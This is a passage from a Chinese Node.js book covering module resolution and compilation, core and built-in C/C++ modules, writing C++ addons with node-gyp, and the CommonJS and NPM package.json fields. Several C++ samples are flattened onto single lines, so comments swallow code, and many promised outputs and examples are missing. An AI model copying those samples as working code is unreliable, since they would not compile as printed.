
require()在分析标识符的过程中，会出现标识符中不包含文件扩展名的情况。CommonJS 模块规范也允许在标识符中不包含文件扩展名，这种情况下，Node 会按.js、.json、.node 的次序补足扩展名，依次尝试。

在尝试的过程中，需要调用 fs 模块同步阻塞式地判断文件是否存在。因为 Node 是单线程的，所以这里是一个会引起性能问题的地方。小诀窍是：如果是.node 和.json 文件，在传递给 require()的标识符中带上扩展名，会加快一点速度。另一个诀窍是：同步配合缓存，可以大幅度缓解 Node 单线程中阻塞式调用的缺陷。

**目录分析和包**

在分析标识符的过程中，require()通过分析文件扩展名之后，可能没有查找到对应文件，但却得到一个目录，这在引入自定义模块和逐个模块路径进行查找时经常会出现，此时 Node 会将目录当做一个包来处理。

在这个过程中，Node 对 CommonJS 包规范进行了一定程度的支持。首先，Node 在当前目录下查找 package.json（CommonJS 包规范定义的包描述文件），通过 JSON.parse()解析出包描述对象，从中取出 main 属性指定的文件名进行定位。如果文件名缺少扩展名，将会进入扩展名分析的步骤。

而如果 main 属性指定的文件名错误，或者压根没有 package.json 文件，Node 会将 index 当做默认文件名，然后依次查找 index.js、index.json、index.node。

如果在目录分析的过程中没有定位成功任何文件，则自定义模块进入下一个模块路径进行查找。如果模块路径数组都被遍历完毕，依然没有查找到目标文件，则会抛出查找失败的异常。

2.2.3 模块编译

在 Node 中，每个文件模块都是一个对象，它的定义如下：

```js
function Module(id, parent) {
  this.id = id;
  this.exports = {};
  this.parent = parent;
  if (parent && parent.children) {
    parent.children.push(this);
  }
  this.filename = null;
  this.loaded = false;
  this.children = [];
}
```

编译和执行是引入文件模块的最后一个阶段。定位到具体的文件后，Node 会新建一个模块对象，然后根据路径载入并编译。对于不同的文件扩展名，其载入方法也有所不同，具体如下所示。

- .js 文件。通过 fs 模块同步读取文件后编译执行。
- .node 文件。这是用 C/C++编写的扩展文件，通过 dlopen()方法加载最后编译生成的文件。
- .json 文件。通过 fs 模块同步读取文件后，用 JSON.parse()解析返回结果。
- 其余扩展名文件。它们都被当做.js 文件载入。

每一个编译成功的模块都会将其文件路径作为索引缓存在 Module.\_cache 对象上，以提高二次引入的性能。

根据不同的文件扩展名，Node 会调用不同的读取方式，如.json 文件的调用如下：

```js
// Native extension for .json
Module._extensions[".json"] = function (module, filename) {
  var content = NativeModule.require("fs").readFileSync(filename, "utf8");
  try {
    module.exports = JSON.parse(stripBOM(content));
  } catch (err) {
    err.message = filename + ": " + err.message;
    throw err;
  }
};
```

其中，Module.\_extensions 会被赋值给 require()的 extensions 属性，所以通过在代码中访问 require.extensions 可以知道系统中已有的扩展加载方式。编写如下代码测试一下：

```js
console.log(require.extensions);
```

得到的执行结果如下：

```js
{ '.js': [Function], '.json': [Function], '.node': [Function] }
```

如果想对自定义的扩展名进行特殊的加载，可以通过类似 require.extensions['.ext']的方式实现。早期的 CoffeeScript 文件就是通过添加 require.extensions['.coffee']扩展的方式来实现加载的。但是从 v0.10.6 版本开始，官方不鼓励通过这种方式来进行自定义扩展名的加载，而是期望先将其他语言或文件编译成 JavaScript 文件后再加载，这样做的好处在于不将烦琐的编译加载等过程引入 Node 的执行过程中。

在确定文件的扩展名之后，Node 将调用具体的编译方式来将文件执行后返回给调用者。

1. JavaScript 模块的编译

回到 CommonJS 模块规范，我们知道每个模块文件中存在着 require、exports、module 这 3 个变量，但是它们在模块文件中并没有定义，那么从何而来呢？甚至在 Node 的 API 文档中，我们知道每个模块中还有**filename、**dirname 这两个变量的存在，它们又是从何而来的呢？如果我们把直接定义模块的过程放诸在浏览器端，会存在污染全局变量的情况。

事实上，在编译的过程中，Node 对获取的 JavaScript 文件内容进行了头尾包装。在头部添加了(function (exports, require, module,**filename, **dirname) {\n，在尾部添加了\n});。一个正常的 JavaScript 文件会被包装成如下的样子：

```js
(function (exports, require, module, __filename, __dirname) {
  var math = require("math");
  exports.area = function (radius) {
    return Math.PI * radius * radius;
  };
});
```

这样每个模块文件之间都进行了作用域隔离。包装之后的代码会通过 vm 原生模块的 runInThisContext()方法执行（类似 eval，只是具有明确上下文，不污染全局），返回一个具体的 function 对象。最后，将当前模块对象的 exports 属性、require()方法、module（模块对象自身），以及在文件定位中得到的完整文件路径和文件目录作为参数传递给这个 function()执行。

这就是这些变量并没有定义在每个模块文件中却存在的原因。在执行之后，模块的 exports 属性被返回给了调用方。exports 属性上的任何方法和属性都可以被外部调用到，但是模块中的其余变量或属性则不可直接被调用。

至此，require、exports、module 的流程已经完整，这就是 Node 对 CommonJS 模块规范的实现。此外，许多初学者都曾经纠结过为何存在 exports 的情况下，还存在 module.exports。理想情况下，只要赋值给 exports 即可：

```js
exports = function () {
  // My Class
};
```

但是通常都会得到一个失败的结果。其原因在于，exports 对象是通过形参的方式传入的，直接赋值形参会改变形参的引用，但并不能改变作用域外的值。测试代码如下：

```js
var change = function (a) {
  a = 100;
  console.log(a); // => 100
};
var a = 10;
change(a);
console.log(a); // => 10
```

如果要达到 require 引入一个类的效果，请赋值给 module.exports 对象。这个迂回的方案不改变形参的引用。

2. C/C++模块的编译 Node 调用 process.dlopen()方法进行加载和执行。在 Node 的架构下，dlopen()方法在 Windows 和\*nix 平台下分别有不同的实现，通过 libuv 兼容层进行了封装。

实际上，.node 的模块文件并不需要编译，因为它是编写 C/C++模块之后编译生成的，所以这里只有加载和执行的过程。在执行的过程中，模块的 exports 对象与.node 模块产生联系，然后返回给调用者。

C/C++模块给 Node 使用者带来的优势主要是执行效率方面的，劣势则是 C/C++模块的编写门槛比 JavaScript 高。

3. JSON 文件的编译

.json 文件的编译是 3 种编译方式中最简单的。Node 利用 fs 模块同步读取 JSON 文件的内容之后，调用 JSON.parse()方法得到对象，然后将它赋给模块对象的 exports，以供外部调用。

JSON 文件在用作项目的配置文件时比较有用。如果你定义了一个 JSON 文件作为配置，那就不必调用 fs 模块去异步读取和解析，直接调用 require()引入即可。此外，你还可以享受到模块缓存的便利，并且二次引入时也没有性能影响。

这里我们提到的模块编译都是指文件模块，即用户自己编写的模块。在下一节中，我们将展开介绍核心模块中的 JavaScript 模块和 C/C++模块。

## 2.3 核心模块

前面提到，Node 的核心模块在编译成可执行文件的过程中被编译进了二进制文件。核心模块其实分为 C/C++编写的和 JavaScript 编写的两部分，其中 C/C++文件存放在 Node 项目的 src 目录下，JavaScript 文件存放在 lib 目录下。

2.3.1 JavaScript 核心模块的编译过程

在编译所有 C/C++文件之前，编译程序需要将所有的 JavaScript 模块文件编译为 C/C++代码，此时是否直接将其编译为可执行代码了呢？其实不是。

1.转存为 C/C++代码 Node 采用了 V8 附带的 js2c.py 工具，将所有内置的 JavaScript 代码（src/node.js 和 lib/\*.js）转换成 C++里的数组，生成 node_natives.h 头文件，相关代码如下：

```c#
namespace node {
const char node_native[] = { 47, 47, ..}; const char dgram_native[] = { 47, 47, ..}; const char console_native[] = { 47, 47, ..}; const char buffer_native[] = { 47, 47, ..}; const char querystring_native[] = { 47, 47, ..}; const char punycode_native[] = { 47, 42, ..}; ... struct _native {
 const char* name;  const char* source;  size_t source_len;
};
static const struct _native natives[] = {  { "node", node_native, sizeof(node_native)-1 },  { "dgram", dgram_native, sizeof(dgram_native)-1 },  ...
};
}
```

在这个过程中，JavaScript 代码以字符串的形式存储在 node 命名空间中，是不可直接执行的。在启动 Node 进程时，JavaScript 代码直接加载进内存中。在加载的过程中，JavaScript 核心模块经历标识符分析后直接定位到内存中，比普通的文件模块从磁盘中一处一处查找要快很多。

2. 编译 JavaScript 核心模块

lib 目录下的所有模块文件也没有定义 require、module、exports 这些变量。在引入 JavaScript 核心模块的过程中，也经历了头尾包装的过程，然后才执行和导出了 exports 对象。与文件模块有区别的地方在于：获取源代码的方式（核心模块是从内存中加载的）以及缓存执行结果的位置。

JavaScript 核心模块的定义如下面的代码所示，源文件通过 process.binding('natives')取出，编译成功的模块缓存到 NativeModule.\_cache 对象上，文件模块则缓存到 Module.\_cache 对象上：

```js
function NativeModule(id) {
  this.filename = id + ".js";
  this.id = id;
  this.exports = {};
  this.loaded = false;
}
NativeModule._source = process.binding("natives");
NativeModule._cache = {};
```

2.3.2 C/C++核心模块的编译过程

在核心模块中，有些模块全部由 C/C++编写，有些模块则由 C/C++完成核心部分，其他部分则由 JavaScript 实现包装或向外导出，以满足性能需求。后面这种 C++模块主内完成核心，JavaScript 主外实现封装的模式是 Node 能够提高性能的常见方式。通常，脚本语言的开发速度优于静态语言，但是其性能则弱于静态语言。而 Node 的这种复合模式可以在开发速度和性能之间找到平衡点。

这里我们将那些由纯 C/C++编写的部分统一称为内建模块，因为它们通常不被用户直接调用。Node 的 buffer、crypto、evals、fs、os 等模块都是部分通过 C/C++编写的。

1. 内建模块的组织形式在 Node 中，内建模块的内部结构定义如下：

```js
struct node_module_struct {
int version;
void *dso_handle;
const char *filename;
void (*register_func) (v8::Handle<v8::Object> target);
const char *modname; };
```

每一个内建模块在定义之后，都通过 NODE_MODULE 宏将模块定义到 node 命名空间中，模块的具体初始化方法挂载为结构的 register_func 成员：

```c#
#define NODE_MODULE(modname, regfunc)  \
extern "C" {  \
 NODE_MODULE_EXPORT node::node_module_struct modname ## _module =  \
{  \
NODE_STANDARD_MODULE_STUFF,  \
regfunc,  \
NODE_STRINGIFY(modname)  \
 };  \
}
```

node_extensions.h 文件将这些散列的内建模块统一放进了一个叫 node_module_list 的数组中，这些模块有：

- node_buffer
- node_crypto
- node_evals
- node_fs
- node_http_parser
- node_os
- node_zlib
- node_timer_wrap
- node_tcp_wrap
- node_udp_wrap
- node_pipe_wrap
- node_cares_wrap
- node_tty_wrap
- node_process_wrap
- node_fs_event_wrap
- node_signal_watcher

这些内建模块的取出也十分简单。Node 提供了 get_builtin_module()方法从 node_module_list 数组中取出这些模块。

内建模块的优势在于：首先，它们本身由 C/C++编写，性能上优于脚本语言；其次，在进行文件编译时，它们被编译进二进制文件。一旦 Node 开始执行，它们被直接加载进内存中，无须再次做标识符定位、文件定位、编译等过程，直接就可执行。

2. 内建模块的导出

在 Node 的所有模块类型中，存在着如图 2-4 所示的一种依赖层级关系，即文件模块可能会依赖核心模块，核心模块可能会依赖内建模块。

图 2-4 依赖层级关系

通常，不推荐文件模块直接调用内建模块。如需调用，直接调用核心模块即可，因为核心模块中基本都封装了内建模块。那么内建模块是如何将内部变量或方法导出，以供外部 JavaScript 核心模块调用的呢？

Node 在启动时，会生成一个全局变量 process，并提供 Binding()方法来协助加载内建模块。Binding()的实现代码在 src/node.cc 中，具体如下所示：

```c#
static Handle<Value> Binding(const Arguments& args) { HandleScope scope;
Local<String> module = args[0]->ToString(); String::Utf8Value module*v(module); node_module_struct* modp;
if (binding*cache.IsEmpty()) {
binding_cache = Persistent<Object>::New(Object::New()); }
Local<Object> exports;
if (binding_cache->Has(module)) { exports = binding_cache->Get(module)->ToObject(); return scope.Close(exports);
}
// Append a string to process.moduleLoadList char buf[1024]; snprintf(buf, 1024, "Binding %s", *module*v); uint32_t l = module_load_list->Length(); module_load_list->Set(l, String::New(buf));
if ((modp = get_builtin_module(*module*v)) != NULL) { exports = Object::New(); modp->register_func(exports); binding_cache->Set(module, exports);
} else if (!strcmp(\_module_v, "constants")) { exports = Object::New(); DefineConstants(exports); binding_cache->Set(module, exports);
#ifdef **POSIX**
} else if (!strcmp(\_module_v, "io_watcher")) { exports = Object::New(); IOWatcher::Initialize(exports); binding_cache->Set(module, exports);
#endif
} else if (!strcmp(\_module_v, "natives")) { exports = Object::New(); DefineJavaScript(exports); binding_cache->Set(module, exports);
} else {
return ThrowException(Exception::Error(String::New("No such module"))); }
return scope.Close(exports); }
```

在加载内建模块时，我们先创建一个 exports 空对象，然后调用 get_builtin_module()方法取出内建模块对象，通过执行 register_func()填充 exports 对象，最后将 exports 对象按模块名缓存，并返回给调用方完成导出。

这个方法不仅可以导出内建方法，还能导出一些别的内容。前面提到的 JavaScript 核心文件被转换为 C/C++数组存储后，便是通过 process.binding('natives')取出放置在 NativeModule.\_source 中的：

```js
NativeModule._source = process.binding("natives");
```

该方法将通过 js2c.py 工具转换出的字符串数组取出，然后重新转换为普通字符串，以对 JavaScript 核心模块进行编译和执行。

2.3.3 核心模块的引入流程

前面讲述了核心模块的原理，也解释了核心模块的引入速度为何是最快的。

从图 2-5 所示的 os 原生模块的引入流程可以看到，为了符合 CommonJS 模块规范，从 JavaScript 到 C/C++的过程是相当复杂的，它要经历 C/C++层面的内建模块定义、（JavaScript）核心模块的定义和引入以及（JavaScript）文件模块层面的引入。但是对于用户而言，require()十分简洁、友好。

图 2-5 os 原生模块的引入流程

2.3.4 编写核心模块核心模块被编译进二进制文件需要遵循一定规则。作为 Node 的使用者，尽管几乎没有机会参与核心模块的开发，但是了解如何开发核心模块有助于我们更加深入地了解 Node。

核心模块中的 JavaScript 部分几乎与文件模块的开发相同，遵循 CommonJS 模块规范，上下文中除了拥有 require、module、exports 外，还可以调用 Node 中的一些全局变量，这里不做描述。

下面我们以 C/C++模块为例演示如何编写内建模块。为了便于理解，我们先编写一个极其简单的 JavaScript 版本的原型，这个方法返回一个 Helloworld！字符串：

```js
exports.sayHello = function () {
  return "Hello world!";
};
```

编写内建模块通常分两步完成：编写头文件和编写 C/C++文件。

(1) 将以下代码保存为 node_hello.h，存放到 Node 的 src 目录下：

```js
#ifndef NODE_HELLO_H* #define NODE*HELLO_H* #include <v8.h>
namespace node { // 定义方法 v8::Handle<v8::Value> SayHello(const v8::Arguments& args);
} #endif
```

(2) 编写 node_hello.cc，并存储到 src 目录下：

```js
#include <node.h> #include <node_hello.h> #include <v8.h>
namespace node {
using namespace v8; //实现定义的方法 Handle<Value> SayHello(const Arguments& args) {
HandleScope scope; return scope.Close(String::New("Hello world!")); }
//给传入的目对象加 sayHello 方法 void Init_Hello(Handle<Object> target) { target->Set(String::NewSymbol("sayHello"), FunctionTemplate::New(SayHello)->GetFunction()); }
} //调用 NODE_MODULE()将注方法定义内存中 NODE_MODULE(node_hello, node::Init_Hello)
```

以上两步完成了内建模块的编写，但是真正要让 Node 认为它是内建模块，还需要更改 src/node_extensions.h，在 NODE_EXT_LIST_END 前添加 NODE_EXT_LIST_ITEM(node_hello)，以将 node_hello 模块添加进 node_module_list 数组中。

其次，还需要让编写的两份代码编译进执行文件，同时需要更改 Node 的项目生成文件 node.gyp，并在’target_name': 'node’节点的 sources 中添加上新编写的两个文件。然后编译整个 Node 项目，具体的编译步骤请参见附录 A。

编译和安装后，直接在命令行中运行以下代码，将会得到期望的效果：

```shell
$ node > var hello = process.binding('hello'); undefined > hello.sayHello(); 'Hello world!' >
```

至此，原生编写过程中需要注意的细节都已表述过了。可以看出，简单的模块通过 JavaScript 来编写可以大大提高生产效率。这里我们写作本节的目的是希望有能力的读者可以深入 Node 的核心模块，去学习它或者改进它。

## 2.4 C/C++扩展模块

对于前端工程师来说，C/C++扩展模块或许比较生疏和晦涩，但是如果你了解了它，在模块出现性能瓶颈时将会对你有极大的帮助。JavaScript 的一个典型弱点就是位运算。JavaScript 的位运算参照 Java 的位运算实现，但是 Java 位运算是在 int 型数字的基础上进行的，而 JavaScript 中只有 double 型的数据类型，在进行位运算的过程中，需要将 double 型转换为 int 型，然后再进行。所以，在 JavaScript 层面上做位运算的效率不高。在应用中，会频繁出现位运算的需求，包括转码、编码等过程，如果通过 JavaScript 来实现，CPU 资源将会耗费很多，这时编写 C/C++扩展模块来提升性能的机会来了。C/C++扩展模块属于文件模块中的一类。前面讲述文件模块的编译部分时提到，C/C++模块通过预先编译为．node 文件，然后调用 process.dlopen()方法加载执行。在这一节中，我们将分析整个 C/C++扩展模块的编写、编译、加载、导出的过程。

在开始编写扩展模块之前，需要强调的一点是，Node 的原生模块一定程度上是可以跨平台的，其前提条件是源代码可以支持在*nix 和 Windows 上编译，其中*nix 下通过 g++/gcc 等编译器编译为动态链接共享对象文件（.so），在 Windows 下则需要通过 Visual C++的编译器编译为动态链接库文件（.dll），如图 2-6 所示。这里有一个让人迷惑的地方，那就是引用加载时却是．node 文件。其实．node 的扩展名只是为了看起来更自然一点，不会因为平台差异产生不同的感觉。实际上，在 Windows 下它是一个．dll 文件，在\*nix 下则是一个．so 文件。为了实现跨平台，dlopen()方法在内部实现时区分了平台，分别用的是加载．so 和．dll 的方式。图 2-6 为扩展模块在不同平台上编译和加载的详细过程。

图 2-6 扩展模块不同平台上的编译和加载过程值得注意的是，一个平台下的．node 文件在另一个平台下是无法加载执行的，必须重新用各自平台下的编译器编译为正确的．node 文件。2.4.1 前提条件如果想要编写高质量的 C/C++扩展模块，还需要深厚的 C/C++编程功底才行。除此之外，以下这些条目都是不能避开的，在了解它们之后，可以让你在编写过程中事半功倍。

- GYP 项目生成工具。在 Node 0.6 中，第三方模块通过它自身提供的 node_waf 工具实现编译，但是它是\*nix 平台下的产物，无法实现跨平台编译。在 Node 0.8 中，Node 决定摒弃掉 node_waf 而采用跨平台效果更好的项目生成器，它就是 GYP 工具，即“Generate YourProjects”短句的缩写。它的好处在于，可以帮助你生成各个平台下的项目文件，比如 Windows 下的 Visual Studio 解决方案文件（.sln）、Mac 下的 XCode 项目配置文件以及 Scons 工具。在这个基础上，再动用各自平台下的编译器编译项目。这大大减少了跨平台模块在项目组织上的精力投入。Node 源码中一度出现过各种项目文件，后来均统一为 GYP 工具。这除了可以减少编写跨平台项目文件的工作量外，另一个简单的原因就是 Node 自身的源码就是通过 GYP 编译的。为此，NathanRajlich 基于 GYP 为 Node 提供了一个专有的扩展构建工具 node-gyp，这个工具通过 npm install -gnode-gyp 这个命令即可安装。
- V8 引擎 C++库。V8 是 Node 自身的动力来源之一。它自身由 C++写成，可以实现 JavaScript 与 C++的互相调用。
- libuv 库。它是 Node 自身的动力来源之二。Node 能够实现跨平台的一个诀窍就是它的 libuv 库，这个库是跨平台的一层封装，通过它去调用一些底层操作，比自己在各个平台下编写实现要高效得多。libuv 封装的功能包括事件循环、文件操作等。
- Node 内部库。写 C++模块时，免不了要做一些面向对象的编程工作，而 Node 自身提供了一些 C++代码，比如 node::ObjectWrap 类可以用来包装你的自定义类，它可以帮助实现对象回收等工作。
- 其他库。其他存在 deps 目录下的库在编写扩展模块时也许可以帮助你，比如 zlib、openssl、http_parser 等。

2.4.2 C/C++扩展模块的编写在介绍 C/C++内建模块时，其实已经介绍了 C/C++模块的编写方式。普通的扩展模块与内建模块的区别在于无须将源代码编译进 Node，而是通过 dlopen()方法动态加载。所以在编写普通的扩展模块时，无须将源代码写进 node 命名空间，也不需要提供头文件。下面我们将采用同一个例子来介绍 C/C++扩展模块的编写。

它的 JavaScript 原型代码与前面的例子一样：

```js
exports.sayHello = function () {
  return "Hello world!";
};
```

新建 hello 目录作为自己的项目位置，编写 hello.cc 并将其存储到 src 目录下，相关代码如下：

```c#
#include <node.h> #include <v8.h>
using namespace v8; //实现定义的方法 Handle<Value> SayHello(const Arguments& args) {
HandleScope scope; return scope.Close(String::New("Hello world!")); }
//给传入的目对象加 sayHello()方法 void Init_Hello(Handle<Object> target) {
target->Set(String::NewSymbol("sayHello"), FunctionTemplate::New(SayHello)->GetFunction()); } //调用 NODE_MODULE()方法将注方法定义内存中 NODE_MODULE(hello, Init_Hello)
```

C/C++扩展模块与内建模块的套路一样，将方法挂载在 target 对象上，然后通过 NODE_MODULE 声明即可。由于不像编写内建模块那样将对象声明到 node_module_list 链表中，所以无法被认作是一个原生模块，只能通过 dlopen()来动态加载，然后导出给 JavaScript 调用。2.4.3 C/C++扩展模块的编译

在 GYP 工具的帮助下，C/C++扩展模块的编译是一件省心的事情，无须为每个平台编写不同的项目编译文件。写好．gyp 项目文件是除编码外的头等大事，然而你也无须担心此事太难，因为．gyp 项目文件是足够简单的。node-gyp 约定．gyp 文件为 binding.gyp，其内容如下所示：

```js
{ 'targets': [
{ 'target_name': 'hello', 'sources': [
'src/hello.cc' ], 'conditions': [
['OS == "win"', {
'libraries': ['-lnode.lib'] } ]
] } ] }
```

然后调用：

```
$ node-gyp configure
```

会得到如下的输出结果：

node-gyp configure 这个命令会在当前目录中创建 build 目录，并生成系统相关的项目文件。在\*nix 平台下，build 目录中会出现 Makefile 等文件；在 Windows 下，则会生成 vcxproj 等文件。继续执行如下代码：

会得到如下的输出结果：

编译过程会根据平台不同，分别通过 make 或 vcbuild 进行编译。编译完成后，hello.node 文件会生成在 build/Release 目录下。

2.4.4 C/C++扩展模块的加载得到 hello.node 结果文件后，如何调用扩展模块其实在前面已经提及。require()方法通过解析标识符、路径分析、文件定位，然后加载执行即可。下面的代码引入前面编译得到的．node 文件，并调用执行其中的方法：

以上代码存为 hello.js，调用 node hello.js 命令即可得到如下的输出结果：

对于以．node 为扩展名的文件，Node 将会调用 process.dlopen()方法去加载文件：

对于调用者而言，require()是轻松愉快的。对于扩展模块的编写者来说，process.dlopen()中隐含的过程值得了解一番。如图 2-7 所示，require()在引入．node 文件的过程中，实际上经历了 4 个层面上的调用。

图 2-7 require()引入．node 文件的过程加载．node 文件实际上经历了两个步骤，第一个步骤是调用 uv_dlopen()方法去打开动态链接库，第二个步骤是调用 uv_dlsym()方法找到动态链接库中通过 NODE_MODULE 宏定义的方法地址。这两个过程都是通过 libuv 库进行封装的：在\*nix 平台下实际上调用的是 dlfcn.h 头文件中定义的 dlopen()和 dlsym()两个方法；在 Windows 平台则是通过 LoadLibraryExW()和 GetProcAddress()这两个方法实现的，它们分别加载．so 和．dll 文件（实际为．node 文件）。这里对 libuv 函数的调用充分表现 Node 利用 libuv 实现跨平台的方式，这样的情景在很多地方还会出现。

由于编写模块时通过 NODE_MODULE 将模块定义为 node_module_struct 结构，所以在获取函数地址之后，将它映射为 node_module_struct 结构几乎是无缝对接的。接下来的过程就是将传入的 exports 对象作为实参运行，将 C++中定义的方法挂载在 exports 对象上，然后调用者就可以轻松调用了。C/C++扩展模块与 JavaScript 模块的区别在于加载之后不需要编译，直接执行之后就可以被外部调用了，其加载速度比 JavaScript 模块略快。使用 C/C++扩展模块的一个好处在于可以更灵活和动态地加载它们，保持 Node 模块自身简单性的同时，给予 Node 无限的可扩展性。关于 node-gyp 工具的更多细节可以参见https://github.com/TooTallNate/node-gyp（作者为Nathan Rajlich, Node 源码的核心贡献者之一）。

## 2.5 模块调用栈

结束文件模块、核心模块、内建模块、C/C++扩展模块等的阐述之后，有必要明确一下各种模块之间的调用关系，如图 2-8 所示。

图 2-8 模块之间的调用关系 C/C++内建模块属于最底层的模块，它属于核心模块，主要提供 API 给 JavaScript 核心模块和第三方 JavaScript 文件模块调用。如果你不是非常了解要调用的 C/C++内建模块，请尽量避免通过 process.binding()方法直接调用，这是不推荐的。JavaScript 核心模块主要扮演的职责有两类：一类是作为 C/C++内建模块的封装层和桥接层，供文件模块调用；一类是纯粹的功能模块，它不需要跟底层打交道，但是又十分重要。文件模块通常由第三方编写，包括普通 JavaScript 模块和 C/C++扩展模块，主要调用方向为普通 JavaScript 模块调用扩展模块。

## 2.6 包与 NPM

Node 组织了自身的核心模块，也使得第三方文件模块可以有序地编写和使用。但是在第三方模块中，模块与模块之间仍然是散列在各地的，相互之间不能直接引用。而在模块之外，包和 NPM 则是将模块联系起来的一种机制。在介绍 NPM 之前，不得不提起 CommonJS 的包规范。JavaScript 不似 Java 或者其他语言那样，具有模块和包结构。Node 对模块规范的实现，一定程度上解决了变量依赖、依赖关系等代码组织性问题。包的出现，则是在模块的基础上进一步组织 JavaScript 代码。图 2-9 为包组织模块示意图。

图 2-9 包组织模块示意图 CommonJS 的包规范的定义其实也十分简单，它由包结构和包描述文件两个部分组成，前者用于组织包中的各种文件，后者则用于描述包的相关信息，以供外部读取分析。
2.6.1 包结构包实际上是一个存档文件，即一个目录直接打包为.zip 或 tar.gz 格式的文件，安装后解压还原为目录。完全符合 CommonJS 规范的包目录应该包含如下这些文件。

- package.json：包描述文件。
- bin：用于存放可执行二进制文件的目录。
- lib：用于存放 JavaScript 代码的目录。
- doc：用于存放文档的目录。
- test：用于存放单元测试用例的代码。可以看到，CommonJS 包规范从文档、测试等方面都做过考虑。当一个包完成后向外公布时，用户看到单元测试和文档的时候，会给他们一种踏实可靠的感觉。2.6.2 包描述文件与 NPM 包描述文件用于表达非代码相关的信息，它是一个 JSON 格式的文件——package.json，位于包的根目录下，是包的重要组成部分。而 NPM 的所有行为都与包描述文件的字段息息相关。由于 CommonJS 包规范尚处于草案阶段，NPM 在实践中做了一定的取舍，具体细节在后面会介绍到。CommonJS 为 package.json 文件定义了如下一些必需的字段。
- name。包名。规范定义它需要由小写的字母和数字组成，可以包含.、\_和-，但不允许出现空格。包名必须是唯一的，以免对外公布时产生重名冲突的误解。除此之外，NPM 还建议不要在包名中附带上 node 或 js 来重复标识它是 JavaScript 或 Node 模块。
- description。包简介。
- version。版本号。一个语义化的版本号，这在http://semver.org/上有详细定义，通常为major.minor.revision格式。该版本号十分重要，常常用于一些版本控制的场合。
- keywords。关键词数组，NPM 中主要用来做分类搜索。一个好的关键词数组有利于用户快速找到你编写的包。
- maintainers。包维护者列表。每个维护者由 name、email 和 web 这 3 个属性组成。示例如下："maintainers": [{ "name": "JacksonTian", "email": "shyvo1987@gmail.com","web": "http://html5ify.com" }]NPM 通过该属性进行权限认证。
- contributors。贡献者列表。在开源社区中，为开源项目提供代码是经常出现的事情，如果名字能出现在知名项目的 contributors 列表中，是一件比较有荣誉感的事。列表中的第一个贡献应当是包的作者本人。它的格式与维护者列表相同。
- bugs。一个可以反馈 bug 的网页地址或邮件地址。
- licenses。当前包所使用的许可证列表，表示这个包可以在哪些许可证下使用。它的格式如下：

* repositories。托管源代码的位置列表，表明可以通过哪些方式和地址访问包的源代码。
* dependencies。使用当前包所需要依赖的包列表。这个属性十分重要，NPM 会通过这个属性帮助自动加载依赖的包。

除了必选字段外，规范还定义了一部分可选字段，具体如下所示。

- homepage。当前包的网站地址。
- os。操作系统支持列表。这些操作系统的取值包括 aix、freebsd、linux、macos、solaris、vxworks、windows。如果设置了列表为空，则不对操作系统做任何假设。
- cpu。CPU 架构的支持列表，有效的架构名称有 arm、mips、ppc、sparc、x86 和 x86_64。同 os 一样，如果列表为空，则不对 CPU 架构做任何假设。
- engine。支持的 JavaScript 引擎列表，有效的引擎取值包括 ejs、flusspferd、gpsee、jsc、spidermonkey、narwhal、node 和 v8。
- builtin。标志当前包是否是内建在底层系统的标准组件。
- directories。包目录说明。
- implements。实现规范的列表。标志当前包实现了 CommonJS 的哪些规范。
- scripts。脚本说明对象。它主要被包管理器用来安装、编译、测试和卸载包。示例如下：

包规范的定义可以帮助 Node 解决依赖包安装的问题，而 NPM 正是基于该规范进行了实现。最初，NPM 工具是由 Isaac Z. Schlueter 单独创建，提供给 Node 服务的 Node 包管理器，需要单独安装。后来，在 v0.6.3 版本时集成进 Node 中作为默认包管理器，作为软件包的一部分一起安装。之后，Isaac Z. Schlueter 也成为 Node 的掌门人。在包描述文件的规范中，NPM 实际需要的字段主要有 name、version、description、keywords、repositories、author、bin、main、scripts、engines、dependencies、devDependencies。

与包规范的区别在于多了 author、bin、main 和 devDependencies 这 4 个字段，下面补充说明一下。

- author。包作者。
- bin。一些包作者希望包可以作为命令行工具使用。配置好 bin 字段后，通过 npm installpackage_name -g 命令可以将脚本添加到执行路径中，之后可以在命令行中直接执行。前面的 node-gyp 即是这样安装的。通过-g 命令安装的模块包称为全局模式。
- main。模块引入方法 require()在引入包时，会优先检查这个字段，并将其作为包中其余模块的入口。如果不存在这个字段，require()方法会查找包目录下的 index.js、index.node、index.json 文件作为默认入口。
- devDependencies。一些模块只在开发时需要依赖。配置这个属性，可以提示包的后续开发者安装依赖包。下面是知名框架 express 项目的 package.json 文件，具有一定的参考意义：

  2.6.3 NPM 常用功能 CommonJS 包规范是理论，NPM 是其中的一种实践。NPM 之于 Node，相当于 gem 之于 Ruby,pear 之于 PHP。对于 Node 而言，NPM 帮助完成了第三方模块的发布、安装和依赖等。借助 NPM,Node 与第三方模块之间形成了很好的一个生态系统。借助 NPM，可以帮助用户快速安装和管理依赖包。除此之外，NPM 还有一些巧妙的用法，下面我们详细介绍一下。

  1.查看帮助在安装 Node 之后，执行 npm -v 命令可以查看当前 NPM 的版本：

在不熟悉 NPM 的命令之前，可以直接执行 NPM 查看到帮助引导说明：

可以看到，帮助中列出了所有的命令，其中 npmhelp <command>可以查看具体的命令说明。2.安装依赖包安装依赖包是 NPM 最常见的用法，它的执行语句是 npm install express。执行该命令后，NPM 会在当前目录下创建 node_modules 目录，然后在 node_modules 目录下创建 express 目录，接着将包解压到这个目录下。

安装好依赖包后，直接在代码中调用 require('express')；即可引入该包。require()方法在做路径分析的时候会通过模块路径查找到 express 所在的位置。模块引入和包的安装这两个步骤是相辅相承的。● 全局模式安装如果包中含有命令行工具，那么需要执行 npminstall express -g 命令进行全局模式安装。需要注意的是，全局模式并不是将一个模块包安装为一个全局包的意思，它并不意味着可以从任何地方通过 require()来引用到它。全局模式这个称谓其实并不精确，存在诸多误导。实际上，-g 是将一个包安装为全局可用的可执行命令。它根据包描述文件中的 bin 字段配置，将实际脚本链接到与 Node 可执行文件相同的路径下：

事实上，通过全局模式安装的所有模块包都被安装进了一个统一的目录下，这个目录可以通过如下方式推算出来：

如果 Node 可执行文件的位置是/usr/local/bin/node，那么模块目录就是/usr/local/lib/node_modules。最后，通过软链接的方式将 bin 字段配置的可执行文件链接到 Node 的可执行目录下。● 从本地安装对于一些没有发布到 NPM 上的包，或是因为网络原因导致无法直接安装的包，可以通过将包下载到本地，然后以本地安装。本地安装只需为 NPM 指明 package.json 文件所在的位置即可：它可以是一个包含 package.json 的存档文件，也可以是一个 URL 地址，也可以是一个目录下有 package.json 文件的目录位置。具体参数如下：

● 从非官方源安装如果不能通过官方源安装，可以通过镜像源安装。在执行命令时，添加--registry=http://registry.url即可，示例如下：

